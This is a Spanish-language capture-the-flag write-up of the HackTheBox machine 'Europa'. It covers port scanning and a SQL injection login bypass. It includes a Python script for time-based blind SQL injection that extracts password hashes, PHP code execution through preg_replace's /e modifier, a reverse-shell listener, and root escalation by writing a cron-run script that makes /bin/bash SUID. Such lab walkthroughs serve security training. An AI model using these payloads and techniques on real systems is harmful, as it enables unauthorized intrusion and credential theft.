---
layout      : post
title       : "Maquina Europa - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Europa/europa.jpeg
category    : [ hackthebox ]
tags        : [ SSL Certificate Inspection Login Bypass , SQLI (Blind Time Based), Python Scripting, Abusing preg replace (REGEX Danger), Abusing Cron Job]
---

El dia de hoy vamos a resolver `Europa` de `hackthebox` una maquina `linux` de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los `CommonNames`, ademas adicionalmente explotaremos una `blind sql` haciendo scripting en `python`. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de `regex` que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario `root` nos aprovecharemos de una tarea `cron` en la que manipularemos el permiso de la `bash`.  
 
Maquina curiosa asi que vamos a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Europa
❯ ls

 Europa
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.22
PING 10.10.10.22 (10.10.10.22) 56(84) bytes of data.
64 bytes from 10.10.10.22: icmp_seq=1 ttl=63 time=132 ms

--- 10.10.10.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 131.781/131.781/131.781/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63` y por proximidad seria correspondiente a una maquina `linux`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.22 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:20 GMT
Initiating SYN Stealth Scan at 01:20
Scanning 10.10.10.22 [65535 ports]
Discovered open port 22/tcp on 10.10.10.22
Discovered open port 443/tcp on 10.10.10.22
Discovered open port 80/tcp on 10.10.10.22
Completed SYN Stealth Scan at 01:20, 26.93s elapsed (65535 total ports)
Nmap scan report for 10.10.10.22
Host is up, received user-set (0.15s latency).
Scanned at 2023-08-07 01:20:05 GMT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 25 (1.100KB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p22,80,443 10.10.10.22 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:22 GMT
Nmap scan report for 10.10.10.22
Host is up (0.24s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.12 seconds
```

Visulizamos información interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH     |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2  |
| 80   | HTTP     |  Apache httpd 2.4.18   |
| 443   | HTTPS     | Apache httpd 2.4.18   |


## EXPLOTACION [#](#explotacion) {#explotacion}

Comenzamos usando `whatweb`, para determinar las tecnologias que esta usando el servicio web.

```bash
❯ whatweb http://10.10.10.22
http://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
❯ whatweb https://10.10.10.22
https://10.10.10.22 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
```

La herramienta no nos reporta mucha información, pero si vemos anteriormente `nmap` nos reporto `CommonNames` en el puerto 443, referentes a `europacorp.htb`. Asi que vamos a proceder a añadirlos a nuestro `/etc/hosts`.


```bash
❯ echo "10.10.10.22 europacorp.htb admin-portal.europacorp.htb" >> /etc/hosts
```

Si ahora vemos el servicio correspondiente al dominio `admin-portal.europacorp.htb` en el navegador, nos redirige a un panel de login.

![](/assets/images/HTB/htb-writeup-Europa/euro1.PNG)


Usaremos `burpsuite` para intentar manipular la petición e intentar colar una inyección.


![](/assets/images/HTB/htb-writeup-Europa/euro2.PNG)

Probamos a tratar de realizar una inyección sql, aplicando un `order by` basandonos en la quinta columna, obtenemos un codigo de estado `302`.

![](/assets/images/HTB/htb-writeup-Europa/euro3.PNG)

Si aplicamos un `follow redirect`, vemos que nos logea al panel administrativo.

![](/assets/images/HTB/htb-writeup-Europa/euro4.PNG)


![](/assets/images/HTB/htb-writeup-Europa/euro5.PNG)

Podriamos seguir resolviendo la maquina, pero si ahora queremos realizar una enumeración de la base de datos para obtener mayor información podemos aprovecharnos de una de las columnas, y intentariamos obtener el nombre por ejemplo de la base de datos.

![](/assets/images/HTB/htb-writeup-Europa/euro6.PNG)

Pero vemos que no podemos ver el `output` de la inyección; por lo tanto ya que estamos a ciegas tendriamos que realizar una inyección basada en tiempo.

Ojo esto es opcional, ya que podriamos continuar con el desarrollo de la máquina normalmente.


Continuando para seguir con la explotación de la `sql time based`, vamos a mandar una query en especifico que sera la siguente, donde aplicaremos una condición que al ser el primer caracter del nombre de la base de datos una `a` la petición tardara 5 segundos.

![](/assets/images/HTB/htb-writeup-Europa/euro7.PNG)

Se valida la inyección correctamente asi que podemos tratar de automatizar el proceso montandonos un script en python y de esta manera obtendriamos la contraseña.


```python
#!/usr/bin/python3

from pwn import *
import string
import urllib3
import sys, pdb, signal, time, requests


def def_handler(sig, frame):
    print("\n[!] Saliendo...!\n")
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)

#globlal vars
main_url = "https://admin-portal.europacorp.htb/login.php"
characters = string.digits + 'abcdef'
urllib3.disable_warnings()

def makeRequest():
    s = requests.session()
    s.verify = False
    
    p1 = log.progress("Fuerza Bruta")

    p1.status("Iniciando proceso de Fuerza Bruta")

    time.sleep(2)
    
    p2 = log.progress("Database")

    data = ""
    for position in range(1, 50):
        for character in characters:

            post_data = {
                    'email':"admin@europacorp.htb' and if(substr((select group_concat(password) from users),%d,1)='%s',sleep(3),1)-- -" % (position, character),
                    'password':'admin'
            }

            p1.status(post_data['email'])
            time_start = time.time()
            r = s.post(main_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 3:
                data += character
                p2.status(data)
                break
if __name__ == '__main__':
    makeRequest()

```

Obtenemos un contraseña hasheada la cual intentaremos crackear.

```bash
2b6d315337f18617ba18922c0b9597ff
```

si lo crackeamos online obtenemos la siguiente contraseña `SuperSecretPassword!`, la cual es valida para el usuario `admin` y nos permite igualmente poder logearnos al sistema.


Una vez dentro del dashboard vemos la opción de `Tools`, donde podemos ver un generador de VPN que vamos a interceptar tambien con `burpsuite`.


![](/assets/images/HTB/htb-writeup-Europa/euro8.PNG)

![](/assets/images/HTB/htb-writeup-Europa/euro9.PNG)

Urldecodeamos la petición y para ver en texto claro como se envia la petición, ahi observamos que se aplica un patron en `pattern` a traves de expresiones regulares.

![](/assets/images/HTB/htb-writeup-Europa/euro10.PNG)

Probamos a validar con una expresión comun de regex y efectivamente se aplica mediante el patron.

![](/assets/images/HTB/htb-writeup-Europa/euro11.PNG)

Si ahora investigamos un poco existe una vulnerabilidad de la cual nos podemos aprovechar a traves de la `regex`, te dejo aqui un articulo para que lo revises a mayor detalle:

* [https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)

Basicamente si le agregamos `e` en la regex, podemos ejecutar codigo `php`.

![](/assets/images/HTB/htb-writeup-Europa/euro12.PNG)

Despues de validar que podemos ejecutar comandos, vamos a enviarnos un revere shell para obtener acceso a la maquina, sin olvidar poner los `&` en urlencode.

![](/assets/images/HTB/htb-writeup-Europa/euro13.PNG)


Nos ponemos en escucha y obtenemos acceso como el usuario `www-data`

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.22.
Ncat: Connection from 10.10.10.22:54978.
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
www-data@europa:/var/www/admin$ whoami
whoami
www-data
```

Como siempre vamos a obtener un tty full interactiva,

```bash
www-data@europa:/var/www/admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@europa:/var/www/admin$ ^Z           
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@europa:/var/www/admin$ export TERM=xterm
www-data@europa:/var/www/admin$ export SHELL=bash
```
y ahora podemos leer la primera flag `user.txt`.

```bash
www-data@europa:/var/www/admin$ cd /home/john/
www-data@europa:/home/john$ cat user.txt 
69ec17e87bcbe179e22c14a776351728
```

## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}

Enumerando el sistema podemos ver que se esta ejecutando una tarea a intervalos de tiempo.

```bash
www-data@europa:/home/john$ cat /etc/crontab       
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *	root	/var/www/cronjobs/clearlogs
```

Si leemos el archivo, vemos que ejecuta un script en bash `logcleared.sh`.

```bash
www-data@europa:/home/john$ cat /var/www/cronjobs/clearlogs
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

Si tratamos de ver el archivo, podemos observar que este no existe, pero podemos crearlo.

```bash
www-data@europa:/home/john$ touch /var/www/cmd/logcleared.sh
```

Ya que el usuario `root` esta ejecutando la tarea cron, vamos a insertar un codigo en donde otorguemos el permiso `suid` a la bash.


```bash
#!/bin/bash

chmod u+s /bin/bash
```

Ahora revisamos el permiso de la bash y podemos convertirnos en el usuario `root` y visualizar la segunda flag `root.txt`.

```bash
www-data@europa:/home/john$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
www-data@europa:/home/john$ bash -p
bash-4.3# cd /root
bash-4.3# cat root.txt 
5245239446324bb1fe4343385751f280
```
